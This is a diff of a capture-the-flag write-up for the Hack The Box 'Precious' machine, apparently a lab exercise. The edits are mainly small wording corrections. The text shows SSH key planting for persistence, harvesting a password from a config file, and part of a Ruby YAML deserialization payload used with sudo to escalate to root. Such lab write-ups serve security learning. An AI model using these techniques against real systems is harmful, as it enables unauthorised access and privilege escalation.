@@ -103,7 +103,7 @@ connect to [10.10.14.12] from precious.htb [10.10.11.189] 40730
 $ 
 ```
 
-I have the shell as user ruby, so the first things I do is create a stable shell with python and create a .ssh folder in /home/ruby, where I'll add my public keys:
+I have the shell as user ruby, so the first things I do is create a stable shell with python and create a .ssh folder in /home/ruby, where I'll add my public key:
 
 ```
 ┌──(j㉿kali)-[~/jno3.github.io/writeups/images]
@@ -126,7 +126,7 @@ On my local computer, I generate the public and private ssh keys:
 └─$ ssh-keygen -t rsa              
 ```
 
-Then I read and copy the public ssh key and past it in the victims machine /home/ruby/.ssh/authorized_hosts:
+Then I read and copy the public ssh key and past it in the victims machine /home/ruby/.ssh/authorized_keys:
 
 ```
 ruby@precious:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCOERHa21bxv/cq1UNyLZ4h32ZF05kjbTgJ/xLHRYTxcyTNFKrb/0J3iJc65DB5lQXFY8Dlslr4NkM68ibhcMuxPUxUXReU+03Y5mtUkF6udRVsHJrdBUmZPuvV/UQcqLDjNHBUF6LldjW7frX4UBuQKemeRdbMDqOtjduNOSUktP/KfqcI4dGJtZ31uttfAjVCNsuJwxd8pCRrTheJVheEqJV1dknUVDo9o+eUaorGDyHfhTICk+ZduVbHregopI7HKbyfI6XQ44flGg1MGxZkd8ZHxFAYOdhMBEzhiuQPqjthIxr9hxIjigI5Mf/Ofm995L0yFjkZ4zNw2h+nYuyWMfXd9lBziU2u2lDTbOUoRiZJyLbGttsXCqHufKUk1/vWBmE255jMXJis3JeOdhXgj5r5be0o6waXCiVShmFHOfZgGLrdll8A7AlQf3P4JFJqdHcvjIYMFEThV0qTEri+UJo2LIo2FHJggfb8KbZ0TzvecijL6QDzboEIBO1K5v0= j@kali" > /home/ruby/.ssh/authorized_keys
@@ -134,7 +134,7 @@ ruby@precious:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCOERHa21bxv/cq1UNyL
 ruby@precious:~$ 
 ```
 
-And log in via ssh from my machine:
+And log in via ssh from my machine using the private key:
 
 ```
 ┌──(j㉿kali)-[~/Desktop/HTB/precious]
@@ -157,7 +157,7 @@ ruby@precious:~$ cat /home/henry/user.txt
 cat: /home/henry/user.txt: Permission denied
 ```
 
-In order to get the user flag I do a whole lot of things, I download linpeas and pspy to check on what can be explored, check on cron jobs, capabilities and suid binaries but to no avail, so I decide to do a little digging, and I find inside ruby's home directory a directory named .bundle, inside of it there is a file named config, that reveals henry's password:
+In order to get the user flag I do a whole lot of things, I download linpeas and pspy to check on what can be explored, check on cron jobs, capabilities and suid binaries to no avail, so I decide to do a little digging and I find inside ruby's home directory a directory named .bundle and inside of it there is a file named config that reveals henry's password:
 
 ```
 ruby@precious:~$ cat .bundle/config 
@@ -175,7 +175,7 @@ henry@precious:~$
 
 I get the user flag and put it into the HTB platform and proceed to privilege escalation.
 
-When I run "sudo -l" as henry, I find out that there's a ruby code that I can run:
+When I run "sudo -l" as henry I find out that there's a ruby code that I can run:
 
 ```
 henry@precious:~$ sudo -l
@@ -222,7 +222,7 @@ gems_file.each do |file_name, file_version|
 end
 ```
 
-I don't know much about ruby, but the only thing that I can control in this code is overt the file used in the YAML.load function, in something that I presume is like library hijacking in Python. So I proceed to google for "YAML hijacking", "yaml exploit ruby" and such to see if I can get anything and it turns out there is a [possible way to do blind RCE through YAML deserialization](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/). So, after taking a while to realize that the "dependencies.yml" file can be loaded from wherever directory I'm currently at, I create a "dependencies.yml" in /home/henry/ that reads:
+I don't know much about ruby but the only thing that I can control in this code is the file used in the YAML.load function, in something that I presume is like library hijacking in Python. So I proceed to google for "YAML hijacking", "yaml exploit ruby" and such to see if I can get anything and it turns out there is a [possible way to do blind RCE through YAML deserialization](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/). So, after taking a while to realize that the "dependencies.yml" file can be loaded from wherever directory I'm currently at, I create a "dependencies.yml" in /home/henry/ that reads:
 
 ```
 - !ruby/object:Gem::Installer
@@ -245,7 +245,7 @@ I don't know much about ruby, but the only thing that I can control in this code
          method_id: :resolve
 ```
 
-After that, I run "sudo -u root /usr/bin/ruby /opt/update_dependencies.rb" from the same directory where I created "dependencies.yml":
+After that, I run "sudo -u root /usr/bin/ruby /opt/update_dependencies.rb" from the same directory where I created "dependencies.yml" (/home/henry):
 
 ```
 henry@precious:~$ sudo -u root /usr/bin/ruby /opt/update_dependencies.rb
